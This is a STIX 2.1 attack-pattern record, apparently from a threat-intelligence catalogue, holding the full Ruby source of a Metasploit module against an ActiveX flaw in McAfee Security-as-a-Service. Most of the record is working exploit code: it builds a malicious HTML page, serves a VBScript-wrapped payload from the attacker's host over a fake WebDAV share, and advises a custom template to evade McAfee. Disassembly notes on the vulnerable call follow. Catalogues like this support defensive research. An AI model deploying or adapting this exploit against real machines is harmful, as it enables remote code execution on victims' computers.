{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--46ee2800-7fa4-4d0c-af1b-1d568113ab8d",
    "created": "2024-08-14T16:35:45.465329Z",
    "modified": "2024-08-14T16:35:45.465334Z",
    "name": "\"McAfee SaaS MyCioScan ShowReport Remote Command Execution\"",
    "description": " This module exploits a vulnerability found in McAfee Security-as-a-Service. The ShowReport() function (located in the myCIOScn.dll ActiveX component) fails to check the FileName argument, and passes it on to a ShellExecuteW() function therefore allows any malicious attacker to execute any process that's on the local system.  However, if the victim machine is connected to a remote share (or something similar), then it's also possible to execute arbitrary code. Please note that a custom template is required for the payload, because the default Metasploit template is detectable by McAfee -- any Windows binary, such as calc.exe or notepad.exe, should bypass McAfee fine.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/mcafee_showreport_exec.rb",
            "external_id": "mcafee_showreport_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::FILEFORMAT\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"McAfee SaaS MyCioScan ShowReport Remote Command Execution\",\n      'Description'    => %q{\n          This module exploits a vulnerability found in McAfee Security-as-a-Service.\n        The ShowReport() function (located in the myCIOScn.dll ActiveX component) fails\n        to check the FileName argument, and passes it on to a ShellExecuteW() function,\n        therefore allows any malicious attacker to execute any process that's on the\n        local system.  However, if the victim machine is connected to a remote share\n        (or something similar), then it's also possible to execute arbitrary code.\n        Please note that a custom template is required for the payload, because the\n        default Metasploit template is detectable by McAfee -- any Windows binary, such\n        as calc.exe or notepad.exe, should bypass McAfee fine.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'rgod',    #Initial discovery\n          'sinn3r',  #Metasploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '78310'],\n          ['BID', '51397'],\n          ['ZDI', '12-012'],\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"none\",\n          #'InitialAutoRunScript' => 'migrate -f',\n          'DisablePayloadHandler' => false\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Internet Explorer', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2012-01-12',\n      'DefaultTarget'  => 0))\n\n    register_options([\n      OptPort.new('SRVPORT',     [ true, \"The daemon port to listen on (do not change)\", 80 ]),\n      OptString.new('SHARENAME', [ true, \"The name of the top-level share.\", \"files\"]),\n      OptString.new('URIPATH',   [ true, \"The URI to use\", \"/\" ]),\n      OptString.new('FILENAME',  [ true, 'The file name.', 'msf.html']),\n      OptPath.new('TEMPLATE',    [true, 'A custom template for the payload in order to bypass McAfee', ''])\n    ])\n  end\n\n  def on_request_uri(cli, request)\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      process_get(cli, request)\n    else\n      print_status(\"#{request.method} => 404 (#{request.uri})\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n    end\n  end\n\n  def process_get(cli, request)\n    print_status(\"URI requested: #{request.uri.to_s}\")\n\n    if request.uri =~ /\\.vbs$/i\n      # Depending on the connection speed, this might take a moment to transfer the\n      # payload and actually get executed\n      send_response(cli, @vbs, {'Content-Type'=>'application/octet-stream'})\n      print_status(\"executable sent\")\n    else\n      # Don't know the request, return not found\n      print_error(\"Don't care about this file, 404\")\n      send_not_found(cli)\n    end\n\n    return\n  end\n\n  def process_options(cli, request)\n    vprint_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = ''\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  def process_propfind(cli, request)\n    path = request.uri\n    vprint_status(\"Received WebDAV PROPFIND request from: #{path}\")\n    body = ''\n\n    my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    my_uri  = \"http://#{my_host}/\"\n\n    if path !~ /\\/$/\n      if path.index(\".\")\n        print_status(\"Sending 404 for #{path} ...\")\n        resp = create_response(404, \"Not Found\")\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      else\n        print_status(\"Sending 301 for #{path} ...\")\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    print_status(\"Sending directory multistatus for #{path} ...\")\n\n    body = <<-BODY\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n    <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}</D:href>\n    <D:propstat>\n    <D:prop>\n    <lp1:resourcetype><D:collection/></lp1:resourcetype>\n    <lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n    <lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n    <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n    <D:supportedlock>\n    <D:lockentry>\n    <D:lockscope><D:exclusive/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    <D:lockentry>\n    <D:lockscope><D:shared/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    </D:supportedlock>\n    <D:lockdiscovery/>\n    <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n    </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n    </D:propstat>\n    </D:response>\n    BODY\n\n    body = body.gsub(/^ {4}/, '')\n\n    if request[\"Depth\"].to_i > 0\n      if path.scan(\"/\").length < 2\n        body << generate_shares(path)\n      else\n        # Set payload name, and set the hidden attribute.  True means visible\n        filenames = [ [@vbs_name, false] ]\n        body << generate_files(path, filenames)\n      end\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def gen_timestamp(ttype=nil)\n    ::Time.now.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n  end\n\n  def gen_datestamp(ttype=nil)\n    ::Time.now.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n  end\n\n  def generate_shares(path)\n    share_name = datastore['SHARENAME']\n    share = <<-SHARE\n    <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}#{share_name}/</D:href>\n    <D:propstat>\n    <D:prop>\n    <lp1:resourcetype><D:collection/></lp1:resourcetype>\n    <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n    <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n    <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n    <D:supportedlock>\n    <D:lockentry>\n    <D:lockscope><D:exclusive/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    <D:lockentry>\n    <D:lockscope><D:shared/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    </D:supportedlock>\n    <D:lockdiscovery/>\n    <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n    </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n    </D:propstat>\n    </D:response>\n    SHARE\n    share = share.gsub(/^ {4}/, '')\n    return share\n  end\n\n  def generate_files(path, items)\n    trail = path.split(\"/\")\n    return \"\" if trail.length < 2\n\n    files = \"\"\n    items.each do |f, hide|\n      h = hide ? '1' : '0'\n      files << <<-FILES\n      <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n      <D:href>#{path}#{f}</D:href>\n      <D:propstat>\n      <D:prop>\n      <lp1:resourcetype/>\n      <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n      <lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>\n      <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n      <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n      <lp2:executable>T</lp2:executable>\n      <D:supportedlock>\n      <D:lockentry>\n      <D:lockscope><D:exclusive/></D:lockscope>\n      <D:locktype><D:write/></D:locktype>\n      </D:lockentry>\n      <D:lockentry>\n      <D:lockscope><D:shared/></D:lockscope>\n      <D:locktype><D:write/></D:locktype>\n      </D:lockentry>\n      </D:supportedlock>\n      <D:lockdiscovery/>\n      <D:getcontenttype>application/octet-stream</D:getcontenttype>\n      </D:prop>\n      <D:status>HTTP/1.1 200 OK</D:status>\n      <D:ishidden b:dt=\"boolean\">#{h}</D:ishidden>\n      </D:propstat>\n      </D:response>\n      FILES\n    end\n\n    files = files.gsub(/^ {6}/, '')\n\n    return files\n  end\n\n  def get_payload\n    fname = rand_text_alpha(5) + \".vbs\"\n    p = payload.encoded\n    exe = Msf::Util::EXE.to_win32pe($framework, p, {:inject=>true, :template=>datastore['TEMPLATE']})\n    vbs = Msf::Util::EXE.to_exe_vbs(exe)\n    return fname, vbs\n  end\n\n  def exploit\n    @vbs_name, @vbs = get_payload\n\n    #\n    # progid: MYCIOSCNLib.Scan\n    # clsid:209EBDEE-065C-11D4-A6B8-00C04F0D38B7\n    #\n    myhost   = datastore['LHOST'] == '0.0.0.0' ? Rex::Socket.source_address : datastore['LHOST']\n    obj_name = rand_text_alpha(rand(6) + 3)\n    sub_name = rand_text_alpha(rand(6) + 3)\n    html = <<-HTML\n    <html>\n    <head>\n    </head>\n    <body>\n    <object classid='clsid:209EBDEE-065C-11D4-A6B8-00C04F0D38B7' id='#{obj_name}'></object>\n    <script language='vbscript'>\n    sub #{sub_name}\n    #{obj_name}.ShowReport \"\\\\\\\\#{myhost}\\\\#{datastore['SHARENAME']}\\\\#{@vbs_name}\"\n    end sub\n\n    #{obj_name}.ShowReport \"\\\\\\\\#{myhost}\\\\#{datastore['SHARENAME']}\"\n    window.setTimeout \"#{sub_name}\", 1000\n    </script>\n    </body>\n    </html>\n    HTML\n\n    html = html.gsub(/^ {4}/, '')\n    file_create(html)\n    print_status(\"#{datastore['FILENAME']} must be run locally in order to execute our payload\")\n\n    super\n  end\nend\n\n=begin\nmyCIOScn!CScnXml::SetNumScanned+0x19ab:\n2101caf9 55              push    ebp\n\n0:003> lmv m myCIOScn\nstart    end        module name\n21000000 2106d000   myCIOScn   (export symbols)       C:\\PROGRA~1\\McAfee\\MANAGE~1\\VScan\\myCIOScn.dll\n    Loaded symbol image file: C:\\PROGRA~1\\McAfee\\MANAGE~1\\VScan\\myCIOScn.dll\n    Image path: C:\\PROGRA~1\\McAfee\\MANAGE~1\\VScan\\myCIOScn.dll\n    Image name: myCIOScn.dll\n    Timestamp:        Wed Aug 10 11:34:01 2011 (4E42CF19)\n    CheckSum:         0007C3A6\n    ImageSize:        0006D000\n    File version:     5.2.3.104\n    Product version:  5.2.0.0\n    File flags:       0 (Mask 3F)\n    File OS:          40004 NT Win32\n    File type:        1.0 App\n    File date:        00000000.00000000\n    Translations:     0409.04b0\n    CompanyName:      McAfee, Inc.\n    ProductName:      McAfee\u00ae Security-as-a-Service\n    InternalName:     myCioScn\n    OriginalFilename: myCioScn.DLL\n    ProductVersion:   5.2.3\n    FileVersion:      5.2.3.104\n    PrivateBuild:     5.2.3.104\n    SpecialBuild:     FULL\n    FileDescription:  myCioScn Module\n\n.text:2101CB1A                 push    esi\n.text:2101CB1B                 push    1\n.text:2101CB1D                 xor     esi, esi\n.text:2101CB1F                 push    esi\n.text:2101CB20                 push    esi\n.text:2101CB21                 push    eax             ; we own this\n.text:2101CB22                 push    offset aOpen    ; \"open\"\n.text:2101CB27                 push    esi\n.text:2101CB28                 mov     [ebp+0A50h+Str], eax\n.text:2101CB2B                 call    off_2105D350    ; ShellExecuteW\n=end\n",
    "x_mitre_disclosure_date": "2012-01-12",
    "x_mitre_platforms": [
        "win'"
    ]
}